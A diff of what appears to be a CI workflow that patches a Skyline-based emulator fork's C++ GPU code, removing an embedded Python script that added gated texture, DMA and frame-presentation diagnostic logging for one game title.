-              '''        auto stagingBuffer{SynchronizeHostImpl()};\n        if (gpu.storm4TextureForensics) {\n            const u64 generation{esContentGeneration.fetch_add(1, std::memory_order_relaxed) + 1};\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            esLastWriter.store(1, std::memory_order_relaxed);\n            esLastWriteEvent.store(event, std::memory_order_relaxed);\n            LOGI("[ES-S4-CPU-UPLOAD] event={} frame={} tex=#{} gen={} fingerprint=0x{:016X} gpuDirty={} layout={} dims={}x{}x{}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), debugId, generation,\n                 DebugGuestFingerprint(), gpuDirty, static_cast<u32>(layout),\n                 dimensions.width, dimensions.height, dimensions.depth);\n        }\n''',
-              'SynchronizeHost CPU upload trace')
-
-          t = replace_in_region(
-              t,
-              '    void Texture::SynchronizeHostInline(',
-              '    std::shared_ptr<memory::StagingBuffer> Texture::SnapshotSampledCpuDirty()',
-              '        auto stagingBuffer{SynchronizeHostImpl()};\n',
-              '''        auto stagingBuffer{SynchronizeHostImpl()};\n        if (gpu.storm4TextureForensics) {\n            const u64 generation{esContentGeneration.fetch_add(1, std::memory_order_relaxed) + 1};\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            esLastWriter.store(1, std::memory_order_relaxed);\n            esLastWriteEvent.store(event, std::memory_order_relaxed);\n            LOGI("[ES-S4-CPU-UPLOAD-INLINE] event={} frame={} tex=#{} gen={} fingerprint=0x{:016X} gpuDirty={} layout={} dims={}x{}x{}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), debugId, generation,\n                 DebugGuestFingerprint(), gpuDirty, static_cast<u32>(layout),\n                 dimensions.width, dimensions.height, dimensions.depth);\n        }\n''',
-              'SynchronizeHostInline CPU upload trace')
-
-          # Host -> guest readback/skip proof.
-          t = replace_in_region(
-              t,
-              '    void Texture::SynchronizeGuest(bool cpuDirty, bool skipTrap) {\n',
-              '    std::shared_ptr<TextureView> Texture::GetView(',
-              '        if (layout == vk::ImageLayout::eUndefined || format != guest->format)\n',
-              '''        if (gpu.storm4TextureForensics) {\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            LOGI("[ES-S4-GPU-READBACK] event={} frame={} tex=#{} gen={} writer={} cpuDirty={} skipTrap={} layout={} formatMatch={} guestWasFreed={}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), debugId,\n                 esContentGeneration.load(std::memory_order_relaxed), esLastWriter.load(std::memory_order_relaxed),\n                 cpuDirty, skipTrap, static_cast<u32>(layout), format == guest->format, esGuestWasFreed);\n        }\n\n        if (layout == vk::ImageLayout::eUndefined || format != guest->format)\n''',
-              'SynchronizeGuest readback trace')
-
-          # Texture -> texture copy path, including presentation copies and internal image copies.
-          t = replace_in_region(
-              t,
-              '    void Texture::CopyFrom(std::shared_ptr<Texture> source,',
-              '    bool Texture::ValidateRenderPassUsage(',
-              '        TRACE_EVENT("gpu", "Texture::CopyFrom");\n',
-              '''        TRACE_EVENT("gpu", "Texture::CopyFrom");\n\n        if (gpu.storm4TextureForensics) {\n            const u64 generation{esContentGeneration.fetch_add(1, std::memory_order_relaxed) + 1};\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            esLastWriter.store(3, std::memory_order_relaxed);\n            esLastWriteEvent.store(event, std::memory_order_relaxed);\n            LOGI("[ES-S4-TEXCOPY] event={} frame={} srcTex=#{} srcGen={} srcWriter={} dstTex=#{} dstGen={} srcLayout={} dstLayout={} dims={}x{}x{} srcFmt={} dstFmt={}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed),\n                 source->debugId, source->esContentGeneration.load(std::memory_order_relaxed), source->esLastWriter.load(std::memory_order_relaxed),\n                 debugId, generation, static_cast<u32>(source->layout), static_cast<u32>(layout),\n                 dimensions.width, dimensions.height, dimensions.depth,\n                 srcFormat ? static_cast<u32>(srcFormat->vkFormat) : 0U, static_cast<u32>(format->vkFormat));\n        }\n''',
-              'Texture CopyFrom trace')
-
-          # Render-target write epochs and the first sample of each content generation.
-          start = t.find('    void Texture::UpdateRenderPassUsage(u32 renderPassIndex, texture::RenderPassUsage renderPassUsage) {\n')
-          end = t.find('    texture::RenderPassUsage Texture::GetLastRenderPassUsage()', start)
-          if start < 0 or end < 0:
-              raise SystemExit('UpdateRenderPassUsage region missing')
-          old_region = t[start:end]
-          new_region = '''    void Texture::UpdateRenderPassUsage(u32 renderPassIndex, texture::RenderPassUsage renderPassUsage) {\n        const u32 esPreviousIndex{lastRenderPassIndex};\n        const auto esPreviousUsage{lastRenderPassUsage};\n\n        if (gpu.storm4TextureForensics && renderPassUsage == texture::RenderPassUsage::RenderTarget &&\n            (esPreviousIndex != renderPassIndex || esPreviousUsage != texture::RenderPassUsage::RenderTarget)) {\n            const u64 generation{esContentGeneration.fetch_add(1, std::memory_order_relaxed) + 1};\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            esLastWriter.store(2, std::memory_order_relaxed);\n            esLastWriteEvent.store(event, std::memory_order_relaxed);\n            LOGI("[ES-S4-RT-WRITE] event={} frame={} tex=#{} gen={} renderPass={} prevPass={} prevUsage={} layout={} dims={}x{}x{}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), debugId, generation,\n                 renderPassIndex, esPreviousIndex, static_cast<u32>(esPreviousUsage), static_cast<u32>(layout),\n                 dimensions.width, dimensions.height, dimensions.depth);\n        }\n\n        if (gpu.storm4TextureForensics && renderPassUsage == texture::RenderPassUsage::Sampled) {\n            const u64 generation{esContentGeneration.load(std::memory_order_relaxed)};\n            const u64 previouslySampled{esLastSampledGeneration.exchange(generation, std::memory_order_relaxed)};\n            if (previouslySampled != generation || esPreviousUsage == texture::RenderPassUsage::RenderTarget) {\n                const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n                LOGI("[ES-S4-SAMPLE] event={} frame={} tex=#{} gen={} writer={} lastWriteEvent={} renderPass={} prevPass={} prevUsage={} pendingStages=0x{:X} readStages=0x{:X} layout={}",\n                     event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), debugId, generation,\n                     esLastWriter.load(std::memory_order_relaxed), esLastWriteEvent.load(std::memory_order_relaxed),\n                     renderPassIndex, esPreviousIndex, static_cast<u32>(esPreviousUsage),\n                     static_cast<u32>(pendingStageMask), static_cast<u32>(readStageMask), static_cast<u32>(layout));\n            }\n        }\n\n        lastRenderPassUsage = renderPassUsage;\n        lastRenderPassIndex = renderPassIndex;\n\n        if (renderPassUsage == texture::RenderPassUsage::RenderTarget) {\n            everUsedAsRt = true;\n            pendingStageMask = vk::PipelineStageFlagBits::eVertexShader |\n                vk::PipelineStageFlagBits::eTessellationControlShader |\n                vk::PipelineStageFlagBits::eTessellationEvaluationShader |\n                vk::PipelineStageFlagBits::eGeometryShader |\n                vk::PipelineStageFlagBits::eFragmentShader |\n                vk::PipelineStageFlagBits::eComputeShader;\n            readStageMask = {};\n        } else if (renderPassUsage == texture::RenderPassUsage::None) {\n            pendingStageMask = {};\n            readStageMask = {};\n        }\n    }\n\n'''
-          if 'lastRenderPassUsage = renderPassUsage;' not in old_region:
-              raise SystemExit('UpdateRenderPassUsage original body unexpected')
-          t = t[:start] + new_region + t[end:]
-
-          # Log every real RT -> shader-read barrier emission. This proves whether the image was synchronized.
-          t = replace_in_region(
-              t,
-              '    void Texture::PopulateReadBarrier(',
-              '\n}',
-              '        if (!(pendingStageMask & dstStage))\n            return;\n\n',
-              '''        if (!(pendingStageMask & dstStage))\n            return;\n\n        if (gpu.storm4TextureForensics) {\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            LOGI("[ES-S4-RT-READ-BARRIER] event={} frame={} tex=#{} gen={} writer={} dstStage=0x{:X} pendingBefore=0x{:X} readStages=0x{:X} layout={}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), debugId,\n                 esContentGeneration.load(std::memory_order_relaxed), esLastWriter.load(std::memory_order_relaxed),\n                 static_cast<u32>(dstStage), static_cast<u32>(pendingStageMask), static_cast<u32>(readStageMask), static_cast<u32>(layout));\n        }\n\n''',
-              'RT read barrier trace')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 3b) Exact attachment-feedback correlation. Storm 4 repeatedly samples the
-          # same backing/subresource it is also rendering to; tag these draws with the
-          # global event clock so we can line them up with writes, binds and frames.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/gpu/interconnect/command_executor.cpp'
-          t = read(rel)
-          old = '''                if (overlap) {\n                    static std::atomic<u64> esOverlappingFeedbackOccurrence{};\n'''
-          new = '''                if (overlap) {\n                    if (gpu.storm4TextureForensics) {\n                        const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n                        LOGI("[ES-S4-FEEDBACK] event={} frame={} tex=#{} gen={} writer={} lastWriteEvent={} rp={} kind={} slot={} sampleView=#{} outputView=#{} sameVkView={} split={} outputValid={} sampledValid={} attachmentsMatch={} sampleMip={}/{} sampleLayer={}/{} outputMip={}/{} outputLayer={}/{}",\n                             event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), sampled->texture->debugId,\n                             sampled->texture->esContentGeneration.load(std::memory_order_relaxed),\n                             sampled->texture->esLastWriter.load(std::memory_order_relaxed),\n                             sampled->texture->esLastWriteEvent.load(std::memory_order_relaxed),\n                             renderPassIndex, outputKind, outputSlot, sampled->esViewId, output->esViewId, sameVkView,\n                             splitRenderPass, outputUsageValid, sampledUsageValid, attachmentsMatch,\n                             sampled->range.baseMipLevel, sampled->range.levelCount, sampled->range.baseArrayLayer, sampled->range.layerCount,\n                             output->range.baseMipLevel, output->range.levelCount, output->range.baseArrayLayer, output->range.layerCount);\n                    }\n                    static std::atomic<u64> esOverlappingFeedbackOccurrence{};\n'''
-          t = replace_once(t, old, new, 'Storm4 feedback correlation trace')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 4) Descriptor bind trace: exact TIC slot -> TextureView -> content generation.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/gpu/interconnect/common/textures.cpp'
-          t = read(rel)
-          if '#include <gpu.h>\n' not in t:
-              t = replace_once(
-                  t,
-                  '#include <soc/gm20b/channel.h>\n',
-                  '#include <gpu.h>\n#include <soc/gm20b/channel.h>\n',
-                  'Textures complete GPU type include'
-              )
-          if '#include <unordered_map>\n' not in t:
-              t = replace_once(t, '#include <unordered_set>\n', '#include <unordered_map>\n#include <unordered_set>\n', 'textures unordered_map include')
-          old = '''        std::unordered_set<u64> esStorm4SeenTextureIds;\n'''
-          new = '''        std::unordered_set<u64> esStorm4SeenTextureIds;\n        std::unordered_map<u32, u64> esStorm4LastSlotViewId;\n        std::atomic<u64> esStorm4BindEvents{};\n'''
-          t = replace_once(t, old, new, 'textures slot view map')
-
-          anchor = '''                if (esFirstUse) {\n                    const u64 firstOccurrence{esStorm4FirstUseEvents.fetch_add(1, std::memory_order_relaxed) + 1};\n'''
-          if anchor not in t:
-              raise SystemExit('Phase7 first-use anchor missing')
-          # Add bind trace inside the existing Storm4-only provenance block, immediately after FIRST-USE handling.
-          old = '''                }\n            }\n            static std::atomic<u64> esTicResolveFormatCount{};\n'''
-          new = '''                }\n\n                bool esBindChanged{};\n                {\n                    std::scoped_lock lock{esStorm4TextureSeenMutex};\n                    auto [it, inserted]{esStorm4LastSlotViewId.try_emplace(index, texture->esViewId)};\n                    if (inserted || it->second != texture->esViewId) {\n                        esBindChanged = true;\n                        it->second = texture->esViewId;\n                    }\n                }\n                if (esBindChanged) {\n                    const u64 occurrence{esStorm4BindEvents.fetch_add(1, std::memory_order_relaxed) + 1};\n                    const u64 event{ctx.gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n                    if (EsStorm4ShouldLog(occurrence, 8192, 2048)) {\n                        LOGI("[ES-S4-BIND] event={} frame={} occurrence={} slot={} sequence={} tex=#{} view=#{} gen={} writer={} lastWriteEvent={} iova=0x{:X} rawFmt=0x{:08X} viewFmt={} viewType={} mip={}/{} layer={}/{} replaced={}",\n                             event, ctx.gpu.storm4PresentFrame.load(std::memory_order_relaxed), occurrence, index,\n                             ctx.channelCtx.channelSequenceNumber, texture->texture->debugId, texture->esViewId,\n                             texture->texture->esContentGeneration.load(std::memory_order_relaxed),\n                             texture->texture->esLastWriter.load(std::memory_order_relaxed),\n                             texture->texture->esLastWriteEvent.load(std::memory_order_relaxed),\n                             textureHeader.Iova(), textureHeader.formatWord.Raw(),\n                             texture->format ? static_cast<u32>(texture->format->vkFormat) : 0U, static_cast<u32>(texture->type),\n                             texture->range.baseMipLevel, texture->range.levelCount, texture->range.baseArrayLayer, texture->range.layerCount,\n                             texture->texture->replaced);\n                    }\n                }\n            }\n            static std::atomic<u64> esTicResolveFormatCount{};\n'''
-          t = replace_once(t, old, new, 'Storm4 bind trace insertion')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 5) TextureManager decisions: CREATE / FULL / LAYER-MIP / REPLACE / OVERLAP.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/gpu/texture_manager.cpp'
-          t = read(rel)
-
-          # FIX3: Phase8 accesses GPU forensic members here. This .cpp previously
-          # only had the forward declaration of GPU through common.h.
-          if '#include <gpu.h>\n' not in t:
-              t = replace_once(
-                  t,
-                  '#include <common/trace.h>\n',
-                  '#include <common/trace.h>\n#include <gpu.h>\n',
-                  'TextureManager complete GPU type include'
-              )
-
-          old = '''                        if (layerMipMatch) {\n                            static std::atomic<u64> esAliasLayerReplaceCount{};\n'''
-          new = '''                        if (layerMipMatch) {\n                            if (gpu.storm4TextureForensics) {\n                                const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n                                LOGI("[ES-S4-TEXMAN] event={} frame={} decision=REPLACE-LAYER-MIP oldTex=#{} newTex=#{} level={} layer={}",\n                                     event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), layerMipMatch->debugId, hostMapping->texture->debugId, matchLevel, matchLayer);\n                            }\n                            static std::atomic<u64> esAliasLayerReplaceCount{};\n'''
-          t = replace_once(t, old, new, 'TextureManager layer-mip replacement trace')
-
-          old = '''                        if (fullMatch) {\n                            static std::atomic<u64> esAliasFullReplaceCount{};\n'''
-          new = '''                        if (fullMatch) {\n                            if (gpu.storm4TextureForensics) {\n                                const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n                                LOGI("[ES-S4-TEXMAN] event={} frame={} decision=REPLACE-FULL oldTex=#{} newTex=#{} level={} layer={}",\n                                     event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), fullMatch->debugId, hostMapping->texture->debugId, matchLevel, matchLayer);\n                            }\n                            static std::atomic<u64> esAliasFullReplaceCount{};\n'''
-          t = replace_once(t, old, new, 'TextureManager full replacement trace')
-
-          old = '''        if (layerMipMatch) {\n            ContextLock textureLock{tag, *layerMipMatch};\n            return layerMipMatch->GetView(guestTexture.viewType, vk::ImageSubresourceRange{\n'''
-          new = '''        if (layerMipMatch) {\n            if (gpu.storm4TextureForensics) {\n                const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n                LOGI("[ES-S4-TEXMAN] event={} frame={} decision=LAYER-MIP-MATCH tex=#{} level={} layer={} guest={}x{}x{} mips={}/{}",\n                     event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), layerMipMatch->debugId, matchLevel, matchLayer,\n                     guestTexture.dimensions.width, guestTexture.dimensions.height, guestTexture.dimensions.depth,\n                     guestTexture.viewMipBase, guestTexture.viewMipCount);\n            }\n            ContextLock textureLock{tag, *layerMipMatch};\n            return layerMipMatch->GetView(guestTexture.viewType, vk::ImageSubresourceRange{\n'''
-          t = replace_once(t, old, new, 'TextureManager layer-mip trace')
-
-          old = '''        } else if (fullMatch) {\n            ContextLock textureLock{tag, *fullMatch};\n            return fullMatch->GetView(guestTexture.viewType, vk::ImageSubresourceRange{\n'''
-          new = '''        } else if (fullMatch) {\n            if (gpu.storm4TextureForensics) {\n                const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n                LOGI("[ES-S4-TEXMAN] event={} frame={} decision=FULL-MATCH tex=#{} guest={}x{}x{} mips={}/{} format={}",\n                     event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), fullMatch->debugId,\n                     guestTexture.dimensions.width, guestTexture.dimensions.height, guestTexture.dimensions.depth,\n                     guestTexture.viewMipBase, guestTexture.viewMipCount, static_cast<u32>(guestTexture.format->vkFormat));\n            }\n            ContextLock textureLock{tag, *fullMatch};\n            return fullMatch->GetView(guestTexture.viewType, vk::ImageSubresourceRange{\n'''
-          t = replace_once(t, old, new, 'TextureManager full-match trace')
-
-          old = '''        for (auto &texture : matches)\n            texture->SynchronizeGuest(false, true);\n\n        // Create a texture as we cannot find one that matches\n'''
-          new = '''        if (gpu.storm4TextureForensics && !matches.empty()) {\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            LOGI("[ES-S4-TEXMAN] event={} frame={} decision=OVERLAP-SYNC overlapCount={} guest={}x{}x{} format={}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), matches.size(),\n                 guestTexture.dimensions.width, guestTexture.dimensions.height, guestTexture.dimensions.depth,\n                 static_cast<u32>(guestTexture.format->vkFormat));\n        }\n        for (auto &texture : matches)\n            texture->SynchronizeGuest(false, true);\n\n        // Create a texture as we cannot find one that matches\n'''
-          t = replace_once(t, old, new, 'TextureManager overlap trace')
-
-          old = '''        auto texture{std::make_shared<Texture>(gpu, guestTexture)};\n        emerald.RegisterTexture(texture, guestTexture, matches);\n'''
-          new = '''        auto texture{std::make_shared<Texture>(gpu, guestTexture)};\n        emerald.RegisterTexture(texture, guestTexture, matches);\n        if (gpu.storm4TextureForensics) {\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            LOGI("[ES-S4-TEXMAN] event={} frame={} decision=CREATE tex=#{} guest={}x{}x{} bytes=0x{:X} layers={} mipLevels={} viewMip={}/{} format={} tileMode={}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), texture->debugId,\n                 guestTexture.dimensions.width, guestTexture.dimensions.height, guestTexture.dimensions.depth,\n                 guestTexture.CalculateLayerSize() * guestTexture.layerCount, guestTexture.layerCount, guestTexture.mipLevelCount,\n                 guestTexture.viewMipBase, guestTexture.viewMipCount, static_cast<u32>(guestTexture.format->vkFormat),\n                 static_cast<u32>(guestTexture.tileConfig.mode));\n        }\n'''
-          t = replace_once(t, old, new, 'TextureManager create trace')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 6) Fermi2D correlation: src/dst texture identity, IOVA, rect and scaling.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/gpu/interconnect/fermi_2d.cpp'
-          t = read(rel)
-          if '#include <gpu.h>\n' not in t:
-              t = replace_once(
-                  t,
-                  '#include <gpu/texture/format.h>\n',
-                  '#include <gpu.h>\n#include <gpu/texture/format.h>\n',
-                  'Fermi2D complete GPU type include'
-              )
-          anchor = '''        auto dstTextureView{gpu.texture.FindOrCreate(dstGuestTexture, executor.tag)};\n        executor.AttachDependency(dstTextureView);\n        executor.AttachTexture(dstTextureView.get());\n        dstTextureView->texture->MarkGpuDirty(executor.usageTracker);\n\n'''
-          insert = '''        auto dstTextureView{gpu.texture.FindOrCreate(dstGuestTexture, executor.tag)};\n        executor.AttachDependency(dstTextureView);\n        executor.AttachTexture(dstTextureView.get());\n        dstTextureView->texture->MarkGpuDirty(executor.usageTracker);\n\n        if (gpu.storm4TextureForensics) {\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            LOGI("[ES-S4-FERMI2D] event={} frame={} sequence={} srcTex=#{} srcView=#{} dstTex=#{} dstView=#{} srcIova=0x{:X} dstIova=0x{:X} src={}x{}x{} dst={}x{}x{} rectSrc=({:.3f},{:.3f}) rectDst=({},{} {}x{}) duDx={:.6f} dvDy={:.6f} resolve={} filter={}",\n                 event, gpu.storm4PresentFrame.load(std::memory_order_relaxed), channelCtx.channelSequenceNumber,\n                 srcTextureView->texture->debugId, srcTextureView->esViewId, dstTextureView->texture->debugId, dstTextureView->esViewId,\n                 u64{srcSurface.address}, u64{dstSurface.address},\n                 srcGuestTexture.dimensions.width, srcGuestTexture.dimensions.height, srcGuestTexture.dimensions.depth,\n                 dstGuestTexture.dimensions.width, dstGuestTexture.dimensions.height, dstGuestTexture.dimensions.depth,\n                 centredSrcRectX, centredSrcRectY, dstRectX, dstRectY, dstRectWidth, dstRectHeight,\n                 duDx, dvDy, resolve, static_cast<u32>(filter));\n        }\n\n'''
-          t = replace_once(t, anchor, insert, 'Fermi2D black-box trace')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 7) Maxwell DMA correlation: raw guest IOVAs and copy geometry in the same event clock.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/soc/gm20b/engines/maxwell_dma.cpp'
-          t = read(rel)
-          anchor = '''        if (esDmaOccurrence <= 16 || (esDmaOccurrence % 2048) == 0)\n            LOGI("[ES-DMA] mode={} multiline={} occurrence #{}", esDmaAccuracy, esMultiLineEnable, esDmaOccurrence);\n\n'''
-          insert = anchor + '''        if (channelCtx.executor.Storm4TextureForensics()) {\n            static std::atomic<u64> esStorm4DmaTraceCount{};\n            const u64 traceCount{esStorm4DmaTraceCount.fetch_add(1, std::memory_order_relaxed) + 1};\n            if (traceCount <= 8192 || (traceCount % 2048) == 0) {\n                const u64 event{channelCtx.executor.NextStorm4ForensicEvent()};\n                const u64 srcIova{u64{*registers.offsetIn}};\n                const u64 dstIova{u64{*registers.offsetOut}};\n                const u32 lineLength{*registers.lineLengthIn};\n                const u32 lineCount{esMultiLineEnable ? static_cast<u32>(*registers.lineCount) : 1U};\n                const u32 pitchIn{esMultiLineEnable ? static_cast<u32>(*registers.pitchIn) : 0U};\n                const u32 pitchOut{esMultiLineEnable ? static_cast<u32>(*registers.pitchOut) : 0U};\n                const u32 srcLayout{static_cast<u32>(registers.launchDma->srcMemoryLayout)};\n                const u32 dstLayout{static_cast<u32>(registers.launchDma->dstMemoryLayout)};\n                const bool remapEnable{static_cast<bool>(registers.launchDma->remapEnable)};\n                LOGI("[ES-S4-DMA] event={} frame={} trace={} sequence={} mode={} src=0x{:X} dst=0x{:X} lineLength=0x{:X} lineCount={} pitchIn=0x{:X} pitchOut=0x{:X} srcLayout={} dstLayout={} remap={} multiline={}",\n                     event, channelCtx.executor.Storm4PresentFrame(), traceCount, channelCtx.channelSequenceNumber, esDmaAccuracy,\n                     srcIova, dstIova, lineLength, lineCount, pitchIn, pitchOut, srcLayout, dstLayout, remapEnable, esMultiLineEnable);\n            }\n        }\n\n'''
-          t = replace_once(t, anchor, insert, 'Storm4 DMA black-box trace')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 8) Presented frame boundary and exact source texture generation.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/gpu/presentation_engine.cpp'
-          t = read(rel)
-          anchor = '''        auto texture{frame.textureView->texture};\n        if (frame.textureView->format != swapchainFormat || texture->dimensions != swapchainExtent)\n'''
-          insert = '''        auto texture{frame.textureView->texture};\n        if (gpu.storm4TextureForensics) {\n            const u64 esFrame{gpu.storm4PresentFrame.fetch_add(1, std::memory_order_relaxed) + 1};\n            const u64 event{gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1};\n            LOGI("[ES-S4-FRAME] event={} frame={} presentedTex=#{} view=#{} gen={} writer={} lastWriteEvent={} layout={} dims={}x{}x{} crop=({},{}-{},{}), transform={} swapInterval={}",\n                 event, esFrame, texture->debugId, frame.textureView->esViewId,\n                 texture->esContentGeneration.load(std::memory_order_relaxed), texture->esLastWriter.load(std::memory_order_relaxed),\n                 texture->esLastWriteEvent.load(std::memory_order_relaxed), static_cast<u32>(texture->layout),\n                 texture->dimensions.width, texture->dimensions.height, texture->dimensions.depth,\n                 frame.crop.left, frame.crop.top, frame.crop.right, frame.crop.bottom, static_cast<u32>(frame.transform), frame.swapInterval);\n        }\n        if (frame.textureView->format != swapchainFormat || texture->dimensions != swapchainExtent)\n'''
-          t = replace_once(t, anchor, insert, 'Present frame black-box trace')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 9) Provenance / diagnostic contract.
-          # -----------------------------------------------------------------------
-          (root/'EMERALD_PHASE8_PROVENANCE.md').write_text('''# Emerald Storm v0.2.40 Phase8 provenance\n\nPhase8 is an original Emerald Storm diagnostic implementation built on the proven v0.2.39 Action #82 source.\n\nStorm 4 black-box battery:\n- global monotonic event id shared by texture, TextureManager, Fermi2D, DMA and presentation;\n- actual Android presented-frame counter;\n- stable TextureView ids;\n- per-texture content generations and last-writer classification;\n- first sample after every content generation;\n- render-target write epochs and RT -> shader-read barrier proof;\n- CPU upload fingerprint and GPU readback trace;\n- texture-to-texture copy trace;\n- exact TIC slot -> TextureView bind changes;\n- TextureManager full/layer-mip/create/replacement/overlap decisions;\n- Fermi2D source/destination IOVA + texture correlation;\n- Maxwell DMA source/destination IOVA + geometry + sequence correlation;\n- presented texture/view/generation on every frame.\n\nHeavy tracing remains gated to Storm 4 title ID `010084D00CF5E000`. No GPL reference source was copied.\n''')
-
-          print('[ES-PHASE8] Storm4 black-box diagnostic battery applied')
-          PYPHASE8
-
-      - name: Verify CAM Phase8 black-box coverage
+      - name: Verify CAM Phase9 feedback-loop correction
         working-directory: ${{ env.ES_SOURCE_DIR }}
         run: |
           set -euo pipefail
-          python3 - <<'PY'
-          from pathlib import Path
-          r=Path('.')
-          files={
-              'gradle':'app/build.gradle',
-              'gpu':'app/src/main/cpp/skyline/gpu.h',
-              'ceh':'app/src/main/cpp/skyline/gpu/interconnect/command_executor.h',
-              'cec':'app/src/main/cpp/skyline/gpu/interconnect/command_executor.cpp',
-              'th':'app/src/main/cpp/skyline/gpu/texture/texture.h',
-              'tc':'app/src/main/cpp/skyline/gpu/texture/texture.cpp',
-              'tm':'app/src/main/cpp/skyline/gpu/texture_manager.cpp',
-              'tic':'app/src/main/cpp/skyline/gpu/interconnect/common/textures.cpp',
-              'f2d':'app/src/main/cpp/skyline/gpu/interconnect/fermi_2d.cpp',
-              'dma':'app/src/main/cpp/skyline/soc/gm20b/engines/maxwell_dma.cpp',
-              'present':'app/src/main/cpp/skyline/gpu/presentation_engine.cpp',
-          }
-          text={k:(r/v).read_text() for k,v in files.items()}
-          if 'versionCode 50' not in text['gradle'] or '0.2.40-cam-phase8-storm4-blackbox-forensics-full-diagnostics-ptbr' not in text['gradle']:
-              raise SystemExit('Phase8 version identity missing')
-          for token in ['storm4ForensicEvent', 'storm4PresentFrame']:
-              if token not in text['gpu']: raise SystemExit('GPU black-box clock missing: '+token)
-          for token in ['Storm4TextureForensics()', 'NextStorm4ForensicEvent()', 'Storm4PresentFrame()']:
-              if token not in text['ceh'] or token not in text['cec']: raise SystemExit('CommandExecutor forensic bridge missing: '+token)
-          for token in ['esViewId', 'esContentGeneration', 'esLastWriter', 'DebugGuestFingerprint']:
-              if token not in text['th']: raise SystemExit('Texture metadata missing: '+token)
-          for token in ['[ES-S4-CPU-UPLOAD]', '[ES-S4-CPU-UPLOAD-INLINE]', '[ES-S4-GPU-READBACK]', '[ES-S4-TEXCOPY]', '[ES-S4-RT-WRITE]', '[ES-S4-SAMPLE]', '[ES-S4-RT-READ-BARRIER]']:
-              if token not in text['tc']: raise SystemExit('Texture lifecycle trace missing: '+token)
-          for token in ['decision=CREATE', 'decision=FULL-MATCH', 'decision=LAYER-MIP-MATCH', 'decision=REPLACE-FULL', 'decision=REPLACE-LAYER-MIP', 'decision=OVERLAP-SYNC']:
-              if token not in text['tm']: raise SystemExit('TextureManager trace missing: '+token)
